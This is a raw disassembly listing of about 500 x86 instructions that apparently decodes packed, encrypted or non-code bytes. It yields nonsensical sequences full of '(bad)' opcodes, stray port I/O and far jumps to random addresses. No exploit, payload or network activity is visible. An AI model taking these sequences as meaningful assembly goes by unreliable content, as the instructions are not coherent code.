  44c723:	retf   
  44c724:	mov    ds:0xdbb4fad5,al
  44c729:	shl    BYTE PTR [edx],1
  44c72b:	inc    esi
  44c72c:	not    BYTE PTR [ecx+0x1f]
  44c72f:	les    esp,FWORD PTR [eax+edx*1+0x4f]
  44c733:	imul   eax,edx,0x1e
  44c736:	ins    BYTE PTR es:[edi],dx
  44c737:	(bad)  ds:0x2a2bf315
  44c73d:	jg     0x44c730
  44c73f:	ins    DWORD PTR es:[edi],dx
  44c740:	enter  0xc463,0xd4
  44c744:	test   BYTE PTR ds:0xc7aa050b,al
  44c74a:	daa    
  44c74b:	add    DWORD PTR [ecx+0x1f081513],ecx
  44c751:	jge    0x44c6eb
  44c753:	mov    ?,WORD PTR [ebx+0x3]
  44c756:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c757:	pop    edx
  44c758:	inc    ecx
  44c759:	(bad)  
  44c75a:	je     0x44c6f0
  44c75c:	jnp    0x44c75f
  44c75e:	fld    QWORD PTR fs:[esi-0x75]
  44c762:	clc    
  44c763:	sub    dl,al
  44c765:	bound  edi,QWORD PTR [ecx-0x37]
  44c768:	jne    0x44c76c
  44c76a:	mov    gs,WORD PTR [ebx]
  44c76c:	inc    edx
  44c76d:	in     eax,dx
  44c76e:	xor    ebx,DWORD PTR [edx]
  44c770:	xor    bh,BYTE PTR [ecx+0x1e]
  44c773:	retf   
  44c774:	ror    esp,cl
  44c776:	fwait
  44c777:	push   ecx
  44c778:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c779:	ds cmp eax,0x6d5852d7
  44c77f:	dec    edx
  44c780:	pop    es
  44c781:	xchg   ebx,eax
  44c782:	mov    WORD PTR [ecx+ecx*4-0xd],ds
  44c786:	dec    BYTE PTR [eax]
  44c788:	in     al,0xa1
  44c78a:	data16 or BYTE PTR [ebp+0x3],0xe0
  44c78f:	xchg   DWORD PTR [ebp-0x2656a50e],ebp
  44c795:	leave  
  44c796:	pusha  
  44c797:	xchg   ecx,eax
  44c798:	add    eax,0xe00c06d3
  44c79d:	setnp  cl
  44c7a0:	inc    ebx
  44c7a1:	in     eax,0x81
  44c7a3:	jmp    FWORD PTR [ecx+0x76b5209c]
  44c7a9:	jae    0x44c7c9
  44c7ab:	daa    
  44c7ac:	xor    al,0xb0
  44c7ae:	dec    ebp
  44c7af:	mov    eax,0xd43ff172
  44c7b4:	cs jg  0x44c784
  44c7b7:	popf   
  44c7b8:	int    0xfb
  44c7ba:	cmc    
  44c7bb:	jle    0x44c746
  44c7bd:	xchg   edi,eax
  44c7be:	lds    eax,FWORD PTR [edi-0x5edf8725]
  44c7c4:	mov    edi,0x347a7c05
  44c7c9:	mov    ds:0x5df85623,eax
  44c7ce:	push   ds
  44c7cf:	inc    edi
  44c7d0:	test   DWORD PTR [di],edi
  44c7d3:	(bad)  
  44c7d4:	call   0x1d190278
  44c7d9:	sub    eax,0x9db65412
  44c7de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44c7df:	or     al,0x89
  44c7e1:	or     DWORD PTR [ecx-0x30],ebp
  44c7e4:	sub    ah,ch
  44c7e6:	and    esp,ecx
  44c7e8:	test   BYTE PTR [edi],0xf9
  44c7eb:	aam    0x7e
  44c7ed:	adc    eax,0xe567d309
  44c7f2:	mov    al,0x5
  44c7f4:	mov    DWORD PTR [ecx-0x63],edi
  44c7f7:	cs in  al,0xa3
  44c7fa:	pop    ebx
  44c7fb:	stos   DWORD PTR es:[edi],eax
  44c7fc:	mov    edx,0xcad70bf5
  44c801:	ss inc ecx
  44c803:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c804:	inc    esp
  44c805:	popf   
  44c806:	dec    ebp
  44c807:	(bad)  [eax+0x38b6e533]
  44c80d:	adc    ecx,ecx
  44c80f:	sub    dl,BYTE PTR [esi+0x24d5c2fa]
  44c815:	fs and bh,bl
  44c818:	das    
  44c819:	jle    0x44c88f
  44c81b:	mov    ecx,0x811fe669
  44c820:	lods   al,BYTE PTR ds:[esi]
  44c821:	fcom   DWORD PTR [ebp-0x1b5c9d9a]
  44c827:	stos   BYTE PTR es:[edi],al
  44c828:	pusha  
  44c829:	push   edx
  44c82a:	ret    
  44c82b:	push   ss
  44c82c:	mov    cl,0xc5
  44c82e:	push   ebx
  44c82f:	add    ecx,DWORD PTR [ecx+0x34]
  44c832:	test   DWORD PTR gs:[edx+0x67c275e8],edx
  44c839:	mov    al,0xca
  44c83b:	pop    esi
  44c83c:	or     BYTE PTR [ebx+0x2d],ch
  44c83f:	lods   eax,DWORD PTR ds:[esi]
  44c840:	or     al,0x94
  44c842:	jae    0x44c83c
  44c844:	mov    ecx,0xd9848141
  44c849:	jmp    0x8613:0x188234c
  44c850:	and    eax,0xba9c2daa
  44c855:	add    bl,BYTE PTR [esi-0x6481d0cb]
  44c85b:	mov    ch,0xe7
  44c85d:	cld    
  44c85e:	pop    ds
  44c85f:	mov    eax,ds:0xc5087c05
  44c864:	or     dl,BYTE PTR [esi+0x23]
  44c867:	stos   BYTE PTR es:[edi],al
  44c868:	lds    esi,FWORD PTR gs:[edx+0x62]
  44c86c:	je     0x44c8d0
  44c86e:	xchg   ecx,esi
  44c870:	cwde   
  44c871:	jb     0x44c8db
  44c873:	jne    0x44c833
  44c875:	inc    edx
  44c876:	jmp    0x86c8463c
  44c87b:	adc    DWORD PTR [eax+0x54],esi
  44c87e:	pop    ds
  44c87f:	sub    eax,DWORD PTR [ecx+0x7262205f]
  44c885:	out    dx,al
  44c886:	xchg   esp,edx
  44c888:	pop    ecx
  44c889:	and    dh,bl
  44c88b:	sub    bh,BYTE PTR fs:[esi]
  44c88e:	dec    ebx
  44c88f:	cmp    cl,BYTE PTR [edx-0x5fd4f985]
  44c895:	fstp   TBYTE PTR [ebx-0x1b]
  44c898:	xor    BYTE PTR ds:0x41dbab85,dl
  44c89e:	out    dx,eax
  44c89f:	ds mov edi,0xed259485
  44c8a5:	push   edx
  44c8a6:	push   ds
  44c8a7:	std    
  44c8a8:	sub    al,0x2d
  44c8aa:	loop   0x44c926
  44c8ac:	cli    
  44c8ad:	nop
  44c8ae:	out    0xd6,eax
  44c8b0:	jbe    0x44c833
  44c8b2:	test   DWORD PTR [edi-0x7e],ebp
  44c8b5:	fwait
  44c8b6:	xchg   ebp,eax
  44c8b7:	fisubr WORD PTR [ebp-0x7d]
  44c8ba:	sub    cl,cl
  44c8bc:	(bad)  
  44c8bd:	mul    DWORD PTR [ecx+ebp*8-0x5b]
  44c8c1:	jne    0x44c89e
  44c8c3:	adc    eax,0xd5e20f86
  44c8c8:	mul    DWORD PTR [edi-0x21]
  44c8cb:	retf   
  44c8cc:	fisubr WORD PTR [ebx]
  44c8ce:	push   es
  44c8cf:	jmp    0x44c859
  44c8d1:	cmp    eax,0xed5c0c62
  44c8d6:	pop    DWORD PTR [ebx+ebx*1+0x1f961403]
  44c8dd:	and    eax,0x2c868dd7
  44c8e2:	jae    0x44c8eb
  44c8e4:	lahf   
  44c8e5:	loope  0x44c8b6
  44c8e7:	adc    DWORD PTR [ebp-0x77b7e131],0x2400095f
  44c8f1:	and    BYTE PTR [esi-0x44b8f92b],cl
  44c8f7:	retf   0x8484
  44c8fa:	fistp  WORD PTR [edx]
  44c8fc:	mov    DWORD PTR [edi],esi
  44c8fe:	xor    DWORD PTR [esi-0x766b6469],0x3e
  44c905:	sbb    eax,0x5e57a03e
  44c90a:	adc    al,0x37
  44c90c:	cmp    ecx,ebp
  44c90e:	js     0x44c97a
  44c910:	mov    ds,WORD PTR [edi-0x34]
  44c913:	stc    
  44c914:	xor    al,BYTE PTR [esi+0x9b03e59]
  44c91a:	int3   
  44c91b:	pop    es
  44c91c:	mov    ebp,DWORD PTR [edi+0x650cc829]
  44c922:	push   ss
  44c923:	push   edi
  44c924:	test   DWORD PTR [ebp+0x4e],0x300360e1
  44c92b:	mov    ebx,0x6e6964f3
  44c930:	mov    DWORD PTR [ecx+0x6600557f],edx
  44c936:	xchg   edi,eax
  44c937:	inc    ebx
  44c938:	xlat   BYTE PTR ds:[ebx]
  44c939:	add    eax,0xd099e2fc
  44c93e:	inc    ebx
  44c93f:	push   esi
  44c940:	rcr    BYTE PTR [ebx+0x356b0360],0x39
  44c947:	push   ebx
  44c948:	mov    esp,0x20bbb429
  44c94d:	dec    edx
  44c94e:	sahf   
  44c94f:	xchg   DWORD PTR [ecx],ecx
  44c951:	push   ebx
  44c952:	mov    ebp,0x1e1da679
  44c957:	add    ebx,DWORD PTR [edi+0x274e4628]
  44c95d:	push   es
  44c95e:	jnp    0x44c964
  44c960:	xchg   edi,eax
  44c961:	fs push ds
  44c963:	sub    ebp,DWORD PTR [ecx-0x2c]
  44c966:	dec    edi
  44c967:	cwde   
  44c968:	(bad)  
  44c969:	fdiv   DWORD PTR [edx-0x27]
  44c96c:	inc    ecx
  44c96d:	or     DWORD PTR [esp+edx*8-0xb79a33e],0x50
  44c975:	sbb    al,0x4a
  44c977:	shl    DWORD PTR [edx-0x42],cl
  44c97a:	dec    esp
  44c97b:	add    BYTE PTR [eax+0x4b],bh
  44c97e:	into   
  44c97f:	or     eax,DWORD PTR [edi-0x1d23bbff]
  44c985:	inc    ecx
  44c986:	inc    ecx
  44c987:	inc    edx
  44c988:	inc    ebp
  44c989:	and    dh,dh
  44c98b:	and    cl,0x27
  44c98e:	fcomp  QWORD PTR [esi+0x5c]
  44c991:	cmp    ebx,DWORD PTR [esi+0x3f9f12a0]
  44c997:	xor    al,0xf2
  44c999:	(bad)  
  44c99a:	fwait
  44c99b:	cdq    
  44c99c:	mov    ebx,0xba01e109
  44c9a1:	push   esp
  44c9a2:	arpl   WORD PTR [edi+0x5ff1941],sp
  44c9a8:	adc    eax,0x19691e69
  44c9ad:	inc    edi
  44c9ae:	pop    ds
  44c9af:	push   es
  44c9b0:	loope  0x44c9eb
  44c9b2:	pop    ds
  44c9b3:	stc    
  44c9b4:	retf   0x2e62
  44c9b7:	and    dh,BYTE PTR [edx-0x6d]
  44c9ba:	add    edx,esp
  44c9bc:	imul   edi,DWORD PTR [eax+0x7a456ae4],0xffffffef
  44c9c3:	mov    BYTE PTR [eax-0x2dbae12d],cl
  44c9c9:	lods   al,BYTE PTR ds:[esi]
  44c9ca:	push   edx
  44c9cb:	lds    ebp,FWORD PTR [eax+0x19]
  44c9ce:	push   0x76eb8e5a
  44c9d3:	push   esp
  44c9d4:	outs   dx,BYTE PTR ds:[esi]
  44c9d5:	mov    fs,edx
  44c9d7:	jnp    0x44c961
  44c9d9:	lea    ebp,[edx]
  44c9db:	push   eax
  44c9dc:	out    dx,al
  44c9dd:	xor    eax,0x2885116
  44c9e2:	dec    edx
  44c9e3:	enter  0x6fcf,0x5b
  44c9e7:	cmp    al,0x68
  44c9e9:	rcr    DWORD PTR [eax-0x6ffd5529],0x1a
  44c9f0:	sahf   
  44c9f1:	je     0x44c9a0
  44c9f3:	call   0xe6ad3786
  44c9f8:	mov    eax,0x923e1f8d
  44c9fd:	lds    ebx,FWORD PTR [ebp+0x46]
  44ca00:	xchg   esi,eax
  44ca01:	dec    edi
  44ca02:	push   ds
  44ca03:	cmp    edx,ebp
  44ca05:	(bad)  
  44ca06:	rol    BYTE PTR [esi],1
  44ca08:	test   BYTE PTR [ebp-0x7e3828fe],dl
  44ca0e:	xchg   dh,cl
  44ca10:	or     cl,bh
  44ca12:	out    0x95,al
  44ca14:	xchg   edi,eax
  44ca15:	pop    ds
  44ca16:	mov    eax,0x1b24275b
  44ca1b:	mov    edx,0x3ebf17ab
  44ca20:	dec    eax
  44ca21:	mov    ecx,0x584920f
  44ca26:	jl     0x44c9cf
  44ca28:	ret    
  44ca29:	and    dl,BYTE PTR [ecx+edi*4-0x30e07781]
  44ca30:	(bad)  
  44ca31:	xchg   esi,eax
  44ca32:	sti    
  44ca33:	push   ebp
  44ca34:	call   0x7be9d692
  44ca39:	mov    bh,0x33
  44ca3b:	push   ss
  44ca3c:	push   eax
  44ca3d:	add    DWORD PTR [ecx-0x623a0ad8],edx
  44ca43:	sbb    DWORD PTR [ebx+eiz*1+0x1b8933af],esi
  44ca4a:	stc    
  44ca4b:	dec    ecx
  44ca4c:	shl    BYTE PTR [edi-0x37672bf5],cl
  44ca52:	ins    BYTE PTR es:[edi],dx
  44ca53:	out    dx,al
  44ca54:	dec    eax
  44ca55:	push   ecx
  44ca56:	das    
  44ca57:	jb     0x44c9e1
  44ca59:	cmp    esi,edx
  44ca5b:	test   DWORD PTR [esi-0x6c],esp
  44ca5e:	pop    edx
  44ca5f:	jmp    0x44ca9e
  44ca61:	add    dl,BYTE PTR [edx]
  44ca63:	xchg   ebp,eax
  44ca65:	jnp    0x44ca21
  44ca67:	adc    ah,cl
  44ca69:	out    0x1f,eax
  44ca6b:	and    eax,0x42229817
  44ca70:	into   
  44ca71:	sub    DWORD PTR [ebx],0xffffffd1
  44ca74:	pop    esi
  44ca75:	out    0xb8,al
  44ca77:	fcmove st,st(0)
  44ca79:	push   ebx
  44ca7a:	and    al,0x34
  44ca7c:	test   al,0x67
  44ca7e:	pusha  
  44ca7f:	iret   
  44ca80:	pushf  
  44ca81:	and    DWORD PTR [edx+0x276f264b],edi
  44ca87:	imul   ecx,DWORD PTR [ebx+0x732b6c05],0x4fcc58a2
  44ca91:	bound  ebx,QWORD PTR [esi]
  44ca93:	outs   dx,DWORD PTR ds:[esi]
  44ca94:	xor    BYTE PTR [edi+0x20],ch
  44ca97:	pop    ebp
  44ca98:	jo     0x44ca3e
  44ca9a:	fwait
  44ca9b:	aam    0x4c
  44ca9d:	in     al,0x2c
  44ca9f:	das    
  44caa0:	fstp   TBYTE PTR [edx+eax*2]
  44caa3:	inc    esi
  44caa4:	xchg   esi,eax
  44caa5:	repz mov al,0x6c
  44caa8:	and    DWORD PTR [esi+0x702c351f],edi
  44caae:	sti    
  44caaf:	scas   al,BYTE PTR es:[edi]
  44cab0:	jmp    0xb073:0xb958e802
  44cab7:	iret   
  44cab8:	mov    bl,0x55
  44caba:	into   
  44cabb:	mov    bh,0x20
  44cabd:	add    ch,dl
  44cabf:	cmp    cl,ah
  44cac1:	aas    
  44cac2:	pushf  
  44cac3:	mov    dh,0xe6
  44cac5:	add    BYTE PTR [edx+0x59af7c67],dh
  44cacb:	js     0x44cb1d
  44cacd:	fisubr DWORD PTR [eax+0x6a3189fe]
  44cad3:	mov    ch,0x12
  44cad5:	fsub   QWORD PTR [edi]
  44cad7:	and    eax,0x4e1a05ac
  44cadc:	pop    ss
  44cadd:	test   eax,0x3595f89e
  44cae2:	pop    ss
  44cae3:	mov    bl,0x89
  44cae5:	pop    ds
  44cae6:	inc    esi
  44cae7:	sbb    al,0x6f
  44cae9:	aam    0x86
  44caeb:	mov    eax,ds:0x6fd40321
  44caf0:	dec    ebx
  44caf1:	dec    eax
  44caf2:	jnp    0x44cb25
  44caf4:	stos   BYTE PTR es:[edi],al
  44caf5:	in     al,0x1f
  44caf7:	add    edx,DWORD PTR [edx+ebx*4-0x48]
  44cafb:	gs push ecx
  44cafd:	ins    DWORD PTR es:[edi],dx
  44cafe:	fld    DWORD PTR [ecx-0x74]
  44cb01:	test   BYTE PTR [edi],bl
  44cb03:	js     0x44cb24
  44cb05:	cmp    al,0x18
  44cb07:	adc    DWORD PTR [ecx-0x2ec06707],ebp
  44cb0d:	add    eax,0x447276a4
  44cb12:	jns    0x44cb45
  44cb14:	add    BYTE PTR ds:0x9d80682e,0xc2
  44cb1b:	xchg   BYTE PTR [eax-0x39a69f4e],ch
  44cb21:	push   edx
  44cb22:	xchg   edx,eax
  44cb23:	stos   BYTE PTR es:[edi],al
  44cb24:	pushf  
  44cb25:	jno    0x44cb29
  44cb27:	xlat   BYTE PTR ds:[ebx]
  44cb28:	mov    esi,DWORD PTR [edi-0x3153ca1f]
  44cb2e:	and    ch,BYTE PTR [esi-0x7a]
  44cb31:	retf   
  44cb32:	je     0x44cb04
  44cb34:	lahf   
  44cb35:	sbb    BYTE PTR [eax],ah
  44cb37:	adc    eax,0x48ff969a
  44cb3c:	rol    DWORD PTR [esi-0x1a],1
  44cb3f:	sar    DWORD PTR [ebx+eax*1],0xfc
  44cb43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44cb44:	mul    DWORD PTR [edi]
  44cb46:	push   edx
  44cb47:	aas    
  44cb48:	sbb    dh,bl
  44cb4a:	mov    ebp,0xdd2b14d5
  44cb4f:	sbb    DWORD PTR [edx-0x30],edi
  44cb52:	rcl    ch,cl
  44cb54:	fimul  WORD PTR [ebp-0x42]
  44cb57:	icebp  
  44cb58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44cb59:	mov    eax,ds:0x38931ee
  44cb5e:	add    al,0x2b
  44cb60:	and    al,0x7
  44cb62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44cb63:	push   edi
  44cb64:	jmp    0x241a:0xecd5f972
  44cb6b:	mov    edi,DWORD PTR [esi-0x77732b45]
  44cb71:	xchg   ecx,eax
  44cb72:	sub    BYTE PTR [esi],bh
  44cb74:	push   esp
  44cb75:	call   0xd73b:0x88454e77
  44cb7c:	mov    BYTE PTR [ebx],bl
  44cb7e:	popa   
  44cb7f:	shr    BYTE PTR [edi-0x67],0x3e
  44cb83:	aas    
  44cb84:	jnp    0x44cbd2
  44cb86:	push   ds
  44cb87:	f2xm1  
  44cb89:	retf   
  44cb8a:	jmp    FWORD PTR [ebp-0x2cb3701a]
  44cb90:	xor    eax,0x6affab42
  44cb95:	les    ebp,FWORD PTR [edi]
  44cb97:	add    eax,0x756ddb30
  44cb9c:	push   eax
  44cb9d:	xchg   esi,eax
  44cb9e:	cs and eax,0x4e58e389
  44cba4:	ins    DWORD PTR es:[edi],dx
  44cba5:	add    ch,al
  44cba7:	fldcw  WORD PTR [ecx-0x69a02f72]
  44cbad:	test   DWORD PTR [eax+0x69],esp
  44cbb0:	mov    bh,0x84
  44cbb2:	pop    es
  44cbb3:	(bad)  
  44cbb4:	mov    al,ds:0xb9d4a66b
  44cbb9:	or     DWORD PTR [edx],edx
  44cbbb:	in     eax,dx
  44cbbc:	cmp    eax,0x89acb87a
  44cbc1:	out    dx,eax
  44cbc2:	push   es
  44cbc3:	ss cmp al,0x15
  44cbc6:	enter  0x651d,0x3
  44cbca:	ds popa 
  44cbcc:	les    edx,FWORD PTR [ebp-0x688bef49]
  44cbd2:	sahf   
  44cbd3:	out    0xd5,eax
  44cbd5:	add    eax,0x1e151144
  44cbda:	mov    bl,BYTE PTR [esi+0x5d3405fd]
  44cbe0:	shl    bh,1
  44cbe2:	add    eax,0x60a8f15d
  44cbe7:	xchg   ebp,eax
  44cbe8:	jb     0x44cb94
  44cbea:	jb     0x44cb88
  44cbec:	sbb    al,0x53
  44cbee:	add    eax,0x976debd6
  44cbf3:	loope  0x44cc1b
  44cbf5:	mov    bh,0xdb
  44cbf7:	push   esp
  44cbf8:	in     al,dx
  44cbf9:	stc    
  44cbfa:	pop    ds
  44cbfb:	ins    DWORD PTR es:[edi],dx
  44cbfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44cbfd:	push   ds
  44cbfe:	in     eax,0xa9
  44cc00:	fcom   QWORD PTR [edx+0x11]
  44cc03:	aam    0xc6
  44cc05:	inc    ebx
  44cc06:	inc    esp
  44cc07:	enter  0xf7d7,0x87
  44cc0b:	adc    eax,0x19333989
  44cc10:	xor    BYTE PTR [ecx],dh
  44cc12:	js     0x44cc21
  44cc14:	fwait
  44cc15:	add    eax,0xa170762
  44cc1a:	cmc    
  44cc1b:	cld    
  44cc1c:	loopne 0x44cc4f
  44cc1e:	pop    ds
  44cc1f:	inc    ecx
  44cc20:	adc    dh,BYTE PTR [edx+0x76]
  44cc23:	jg     0x44cca1
  44cc25:	jae    0x44cc5c
  44cc27:	xlat   BYTE PTR ds:[ebx]
  44cc28:	ja     0x44cbbc
  44cc2a:	mov    esp,0xf1183691
  44cc2f:	test   eax,0xb70c8588
  44cc34:	test   BYTE PTR [esi],ch
  44cc36:	dec    DWORD PTR [esp+eax*2+0x1c1a2402]
  44cc3d:	repnz add al,0x20
  44cc40:	add    BYTE PTR ds:0xfc35fd1e,ch
  44cc46:	cmp    esp,DWORD PTR [ecx+0x6a]
  44cc49:	je     0x44cbf1
  44cc4b:	xlat   BYTE PTR ds:[ebx]
  44cc4c:	hlt    
  44cc4d:	pop    ecx
  44cc4e:	call   0x3e11f5e0
  44cc53:	push   esi
  44cc54:	mov    al,ds:0xe3070f94
  44cc59:	ret    
  44cc5a:	pop    ds
  44cc5b:	ret    
  44cc5c:	cmc    
  44cc5d:	cmp    al,0x7c
  44cc5f:	jo     0x44cc7d
  44cc61:	jne    0x44cc23
  44cc63:	aam    0x72
  44cc65:	aas    
  44cc66:	mov    cl,0x9d
  44cc68:	repz lahf 
  44cc6a:	or     esi,ebp
  44cc6c:	mov    ebx,DWORD PTR [edi]
  44cc6e:	push   es
  44cc6f:	sbb    eax,DWORD PTR ds:[esi-0x6397414b]
  44cc76:	mov    al,ds:0xa8c381d4
  44cc7b:	lea    eax,[edx]
  44cc7d:	repnz cmp BYTE PTR [ebp+0x86dcb89],al
  44cc84:	mov    DWORD PTR [eax+0x292fa57],edx
  44cc8a:	pop    esi
  44cc8b:	(bad)  
  44cc8c:	fbstp  TBYTE PTR [ecx+0x273df5c5]
  44cc92:	push   ds
  44cc93:	add    edx,DWORD PTR [edx+0x14]
  44cc96:	pop    ds
  44cc97:	inc    edx
  44cc98:	jp     0x44cc5b
  44cc9a:	in     eax,dx
  44cc9b:	aad    0x42
  44cc9d:	pop    eax
  44cc9e:	jae    0x44cc6a
  44cca0:	xchg   edi,eax
  44cca1:	mov    ebx,0x1bfdde92
  44cca6:	fild   QWORD PTR [ebp+0xab628d6]
  44ccac:	or     edi,ebp
  44ccae:	lds    esp,FWORD PTR [ebx+eax*8+0x17]
  44ccb2:	shl    dh,cl
  44ccb4:	in     al,dx
  44ccb5:	or     edx,edi
  44ccb7:	mov    ch,0x63
  44ccb9:	inc    esp
  44ccba:	fidiv  DWORD PTR [edx-0x60de6453]
  44ccc0:	mov    DWORD PTR ds:0xafb8438e,esp
  44ccc6:	jle    0x44cc9d
  44ccc8:	and    ecx,DWORD PTR [edx-0x585c2558]
  44ccce:	retf   
  44cccf:	test   al,0xb9
  44ccd1:	bound  ebp,QWORD PTR [ebp+edi*8-0x64]
  44ccd5:	dec    esp
  44ccd6:	fbld   TBYTE PTR [eax+ebp*8-0x51f2ce7d]
  44ccdd:	add    eax,0x2571f5ee
  44cce2:	mov    ecx,0x1f9a5e54
  44cce7:	mov    DWORD PTR [edi],edx
  44cce9:	push   ds
  44ccea:	cmp    al,0x39
  44ccec:	enter  0x34a7,0xad
  44ccf0:	mov    ecx,0x1ac70930
  44ccf5:	shr    DWORD PTR [edi+0x1c],0x15
  44ccf9:	push   edi
  44ccfa:	push   ds
  44ccfb:	shr    DWORD PTR [ebp-0x4e],cl
  44ccfe:	sahf   
  44ccff:	sub    DWORD PTR [eax+0xb],esp
  44cd02:	and    al,0xd4
  44cd04:	sti    
  44cd05:	out    dx,al
  44cd06:	xchg   esi,eax
  44cd07:	ja     0x44cd47
  44cd09:	popf   
  44cd0a:	outs   dx,DWORD PTR ds:[esi]
  44cd0b:	fimul  DWORD PTR [ecx-0x7de29585]
  44cd11:	lds    ecx,FWORD PTR [ebp+0x2272cabd]
  44cd17:	dec    ebx
  44cd18:	xchg   edi,eax
  44cd19:	mov    WORD PTR [ebx-0x57],cs
  44cd1c:	(bad)  
  44cd1e:	xchg   edi,eax
  44cd1f:	ficomp WORD PTR [eax-0x91e042c]
  44cd25:	mov    esp,DWORD PTR [edx+0x3baf89cf]
  44cd2b:	cmp    cl,BYTE PTR [ebp+0x6c]
  44cd2e:	lods   eax,DWORD PTR ds:[esi]
  44cd2f:	test   edi,esi
  44cd31:	add    eax,0x214f4fd2
  44cd36:	jno    0x44ccf0
  44cd38:	or     eax,0x4ddd6099
  44cd3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44cd3e:	call   0x6edf5156
  44cd43:	aad    0x68
  44cd45:	add    DWORD PTR [esi+edi*4-0x638bd83e],esi
  44cd4c:	repnz push ebx
  44cd4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44cd4f:	aad    0x1a
  44cd51:	cmp    eax,0xea52ebc0
  44cd56:	push   es
  44cd57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44cd58:	fnstsw WORD PTR [ebx]
  44cd5a:	fistp  DWORD PTR [edi-0x22]
  44cd5d:	lds    edx,FWORD PTR [ebx]
  44cd5f:	sbb    edi,DWORD PTR [ebp-0x6a]
  44cd62:	pop    ds
  44cd63:	pop    es
  44cd64:	fisubr DWORD PTR [edx]
  44cd66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44cd67:	or     edi,ebp
  44cd69:	push   0x79
  44cd6b:	pop    ebp
  44cd6c:	xor    esp,DWORD PTR [ecx+0x326fc560]
  44cd72:	mov    ah,0x50
  44cd74:	push   ecx
  44cd75:	push   es
  44cd76:	outs   dx,BYTE PTR ds:[esi]
  44cd77:	stos   DWORD PTR es:[edi],eax
  44cd78:	lds    edx,FWORD PTR [eax+ebx*4]
  44cd7b:	shr    ecx,cl
  44cd7d:	inc    esp
  44cd7e:	aas    
  44cd7f:	test   al,0xe2
  44cd81:	add    al,BYTE PTR [esi-0x2d]
  44cd84:	cmc    
  44cd85:	or     edi,esi
  44cd87:	inc    ebp
  44cd88:	(bad)  
  44cd89:	xchg   ebp,eax
  44cd8a:	pusha  
  44cd8b:	xchg   ebx,eax
  44cd8c:	sbb    dh,cl
  44cd8e:	pop    eax
  44cd8f:	test   al,0x0
  44cd91:	push   ss
  44cd92:	inc    ebx
  44cd93:	xlat   BYTE PTR ds:[ebx]
  44cd94:	cs popf 
  44cd96:	xchg   edi,eax
  44cd97:	in     eax,dx
  44cd98:	inc    esi
  44cd99:	or     eax,0xde8c0732
  44cd9e:	push   0x47e0bd6d
  44cda3:	pusha  
  44cda4:	pop    es
  44cda5:	and    DWORD PTR [edi-0x6aaf59],ebx
  44cdab:	aad    0x45
  44cdad:	mov    cl,0x2c
  44cdaf:	dec    eax
  44cdb0:	mov    ebx,0x710c26a7
  44cdb5:	cmp    eax,0x15880b2f
  44cdba:	ins    DWORD PTR es:[edi],dx
  44cdbb:	pop    DWORD PTR [ebx+0x5]
  44cdbe:	dec    dx
  44cdc0:	or     al,BYTE PTR [ecx]
  44cdc2:	fisubr WORD PTR [ecx+0x70]
  44cdc5:	cmp    eax,0xbad44b06
  44cdca:	test   BYTE PTR [ebx-0x4b783675],dl
  44cdd0:	ins    BYTE PTR es:[edi],dx
  44cdd1:	outs   dx,BYTE PTR ds:[esi]
  44cdd2:	popa   
  44cdd3:	lock cmp BYTE PTR [edi+0x52eed5dd],ah
  44cdda:	mov    ecx,0x3f7492b8
  44cddf:	jmp    0xb515:0x2e28678c
  44cde6:	(bad)  
  44cde8:	mov    edx,0x3316be2e
  44cded:	(bad)  
  44cdee:	aas    
  44cdef:	mov    ch,0x82
  44cdf1:	and    bh,BYTE PTR [ecx-0x271ddd64]
  44cdf7:	jns    0x44cdcf
  44cdf9:	pop    ds
  44cdfa:	lock inc eax
  44cdfc:	dec    ebx
  44cdfd:	add    al,0xa0
  44cdff:	xchg   BYTE PTR [edx-0x50c49ec9],ah
  44ce05:	in     eax,dx
  44ce06:	xchg   ebx,eax
  44ce07:	sub    eax,0xe8e0cf14
  44ce0c:	push   ds
  44ce0d:	pop    si
  44ce0f:	adc    edi,DWORD PTR [esi]
  44ce11:	jo     0x44ce31
  44ce13:	aaa    
  44ce14:	xchg   BYTE PTR [ecx+0x5c4a8b96],bh
  44ce1a:	push   ds
  44ce1b:	jns    0x44ce65
  44ce1d:	inc    eax
  44ce1e:	mov    cl,0x90
  44ce20:	add    al,0x58
  44ce22:	mov    ecx,0x7cd27884
  44ce27:	or     eax,0xd4181561
  44ce2c:	mov    DWORD PTR [ecx+0x57],edi
  44ce2f:	mov    eax,0xc7645cb5
  44ce34:	hlt    
  44ce35:	dec    eax
  44ce36:	lahf   
  44ce37:	sub    BYTE PTR [ebx+0x67],cl
  44ce3a:	push   ds
  44ce3b:	(bad)  
  44ce3c:	out    dx,al
  44ce3d:	into   
  44ce3e:	iret   
  44ce3f:	pop    ebp
  44ce40:	ds cmc 
  44ce42:	sub    eax,0x1ab7e9d7
  44ce47:	aam    0xc4
  44ce49:	into   
  44ce4a:	cs pop esi
  44ce4c:	mov    ch,bl
  44ce4e:	jg     0x44cdeb
  44ce50:	pop    esp
  44ce51:	push   edx
  44ce52:	mov    al,0x64
  44ce54:	xchg   ebx,eax
  44ce55:	add    eax,0x55115458
  44ce5a:	inc    esi
  44ce5b:	push   ebx
  44ce5c:	add    esi,DWORD PTR [ecx+0x1f]
  44ce5f:	add    eax,0x256bcac5
  44ce64:	dec    eax
  44ce65:	outs   dx,DWORD PTR ds:[esi]
  44ce66:	jno    0x44ce3c
  44ce68:	jge    0x44ced8
  44ce6a:	push   ss
  44ce6b:	dec    ebx
  44ce6c:	iret   
  44ce6d:	fs or  eax,0x38659fc7
  44ce73:	or     edx,esp
  44ce75:	push   ds
  44ce76:	mov    ah,BYTE PTR [ecx-0x59]
  44ce79:	add    BYTE PTR [ebx],0x7
  44ce7c:	hlt    
  44ce7d:	push   es
  44ce7e:	(bad)  
  44ce7f:	aad    0x8d
  44ce81:	sub    al,0xce
  44ce84:	jle    0x44cec1
  44ce86:	mov    esi,0xa6f5f5f5
  44ce8b:	inc    ecx
  44ce8c:	loop   0x44ce93
